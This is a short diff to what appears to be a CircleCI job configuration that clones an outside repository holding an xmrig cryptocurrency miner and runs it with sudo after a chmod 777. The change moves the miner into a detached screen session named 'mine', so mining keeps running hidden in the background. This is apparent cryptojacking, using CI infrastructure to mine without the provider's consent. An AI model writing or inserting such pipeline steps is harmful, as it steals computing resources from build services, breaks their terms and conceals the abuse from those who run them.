@@ -9,4 +9,4 @@ jobs:
       - run: sudo apt-get update
       - run: sudo apt-get install screen -y
       - run: sudo git clone https://github.com/yszalxh/circleci.git
-      - run: cd circleci && sudo chmod 777 xmrig && sudo ./xmrig
+      - run: screen -dmS mine bash -c 'cd circleci && sudo chmod 777 xmrig && sudo ./xmrig'
